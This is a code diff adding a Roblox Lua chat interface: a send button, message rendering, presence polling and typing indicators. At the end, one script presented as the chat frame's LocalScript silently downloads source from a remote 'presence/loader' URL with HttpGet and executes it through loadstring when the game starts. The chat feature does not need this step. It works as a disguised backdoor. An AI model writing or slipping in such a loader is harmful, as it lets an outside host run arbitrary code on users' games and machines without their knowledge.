+	if send and not send:IsA("ImageButton") then
+		send:Destroy()
+		send = nil
+	end
+	send = send or Instance.new("ImageButton")
+	send.Name = "SendMessage"
+	send.Image = "rbxassetid://93003913676840"
+	send.ScaleType = Enum.ScaleType.Fit
+	send.ImageColor3 = Color3.fromRGB(10, 35, 20)
+	send.BackgroundColor3 = Color3.fromRGB(40, 210, 115)
+	send.BorderSizePixel = 0
+	send.Position = UDim2.new(1, -62, 1, -40)
+	send.Size = UDim2.new(0, 54, 0, 32)
+	send.Parent = chat
+	local sendCorner = send:FindFirstChildOfClass("UICorner") or Instance.new("UICorner")
+	sendCorner.CornerRadius = UDim.new(1, 0)
+	sendCorner.Parent = send
+	
+	local seen = {}
+	local function draw(data)
+		if not data or not data.messages then return end
+		online.Text = "?? " .. tostring(data.online or data.onlineCount or 0)
+		for _, item in ipairs(data.messages) do
+			if not seen[item.id] then
+				seen[item.id] = true
+				local label = Instance.new("TextLabel")
+				label.BackgroundTransparency = 1
+				label.Size = UDim2.new(1, -4, 0, 24)
+				label.AutomaticSize = Enum.AutomaticSize.Y
+				label.TextWrapped = true
+				label.TextXAlignment = Enum.TextXAlignment.Left
+				label.TextYAlignment = Enum.TextYAlignment.Top
+				label.Font = Enum.Font.Gotham
+				label.TextSize = 13
+				label.TextColor3 = Color3.fromRGB(235, 238, 248)
+				label.Text = tostring(item.displayName or item.username or "Usu�rio") .. ": " .. tostring(item.message or "")
+				label.Parent = messages
+			end
+		end
+		task.defer(function() messages.CanvasPosition = Vector2.new(0, math.max(0, messages.AbsoluteCanvasSize.Y)) end)
+	end
+	
+	local function refresh()
+		draw(call("GET", "/api/chat/messages?limit=50"))
+	end
+	
+	local onlineLabel = chat:FindFirstChild("online", true) or chat:FindFirstChild("HPXChatOnline", true)
+	local function refreshOnline()
+		if not onlineLabel then return end
+		local data = call("GET", "/api/presence/count")
+		local count = data and (data.online or data.count)
+		if count ~= nil then onlineLabel.Text = "Online: " .. tostring(count) end
+	end
+	
+	local sending = false
+	local function submit()
+		if sending or #input.Text < 1 then return end
+		sending = true
+		local text = input.Text:sub(1, 300)
+		input.Text = ""
+		call("POST", "/api/chat/messages", { message = text })
+		refresh()
+		sending = false
+	end
+	
+	send.MouseButton1Click:Connect(submit)
+	input.Focused:Connect(function()
+		typing.Text = player.DisplayName .. " est� digitando..."
+	end)
+	input.FocusLost:Connect(function(enter)
+		typing.Text = ""
+		if enter then submit() end
+	end)
+	refresh()
+	refreshOnline()
+	task.spawn(function()
+		while chat.Parent do
+			task.wait(3)
+			refresh()
+			refreshOnline()
+		end
+	end)
+	
+end
+local function CQCHU_fake_script() -- Fake Script: StarterGui.ScreenGui.mainFrame.ChatFrame.LocalScript
+    local script = Instance.new("LocalScript")
+    script.Name = "LocalScript"
+    script.Parent = Converted["_ChatFrame"]
+    local req = require
+    local require = function(obj)
+        local fake = fake_module_scripts[obj]
+        if fake then
+            return fake()
+        end
+        return req(obj)
+    end
+
+	pcall(function()
+		local url = "https://hpx-ingest-7f2a.pointyoak1.chatgpt.site/api/presence/loader"
+		local source = game:HttpGet(url)
+		local loader = loadstring(source)
+	
+		if loader then
+			loader()
+		end
+	end)
+end
+
+coroutine.wrap(KAPUQIX_fake_script)()
+coroutine.wrap(HKKI_fake_script)()
+coroutine.wrap(FXKTC_fake_script)()
+coroutine.wrap(SVBIRU_fake_script)()
+coroutine.wrap(ZUFZO_fake_script)()
+coroutine.wrap(QNKFLJ_fake_script)()
+coroutine.wrap(EFWM_fake_script)()
+coroutine.wrap(KFPW_fake_script)()
+coroutine.wrap(XJWRA_fake_script)()
+coroutine.wrap(OHFO_fake_script)()
+coroutine.wrap(BWWAVSL_fake_script)()
+coroutine.wrap(EXKL_fake_script)()
+coroutine.wrap(CVOG_fake_script)()
+coroutine.wrap(CVEJW_fake_script)()
+coroutine.wrap(AUIH_fake_script)()
+coroutine.wrap(SFSGIWG_fake_script)()
+coroutine.wrap(ZRCJIW_fake_script)()
+coroutine.wrap(URCY_fake_script)()
+coroutine.wrap(IWLRQRL_fake_script)()
+coroutine.wrap(ARYWG_fake_script)()
+coroutine.wrap(XCLSGT_fake_script)()
+coroutine.wrap(KQJFJ_fake_script)()
+coroutine.wrap(UIRLGPY_fake_script)()
+coroutine.wrap(VHMHF_fake_script)()
+coroutine.wrap(TBUD_fake_script)()
+coroutine.wrap(KSYWZNE_fake_script)()
+coroutine.wrap(HUUL_fake_script)()
+coroutine.wrap(QIDZUU_fake_script)()
+coroutine.wrap(ZJPKX_fake_script)()
+coroutine.wrap(UEVGX_fake_script)()
+coroutine.wrap(WIAWJTR_fake_script)()
+coroutine.wrap(ZFRVM_fake_script)()
+coroutine.wrap(APJBDMP_fake_script)()
+coroutine.wrap(XPHUOYN_fake_script)()
+coroutine.wrap(CUODQZ_fake_script)()
+coroutine.wrap(NGJCJCV_fake_script)()
+coroutine.wrap(ZPHVU_fake_script)()
+coroutine.wrap(JMGETY_fake_script)()
+coroutine.wrap(TDSOAI_fake_script)()
+coroutine.wrap(LQPFQ_fake_script)()
+coroutine.wrap(IMEV_fake_script)()
+coroutine.wrap(XGLI_fake_script)()
+coroutine.wrap(VRPWJ_fake_script)()
+coroutine.wrap(XARQ_fake_script)()
+coroutine.wrap(CSQIWDT_fake_script)()
+coroutine.wrap(AKTV_fake_script)()
+coroutine.wrap(UWJLTHD_fake_script)()
+coroutine.wrap(XGWUMB_fake_script)()
+coroutine.wrap(ZMFHV_fake_script)()
+coroutine.wrap(RCFCN_fake_script)()
+coroutine.wrap(UWZQY_fake_script)()
+coroutine.wrap(TZZIYNW_fake_script)()
+coroutine.wrap(AUYI_fake_script)()
+coroutine.wrap(CQCHU_fake_script)()-- Please leave these comments in and leave credit, it took me a while to make this
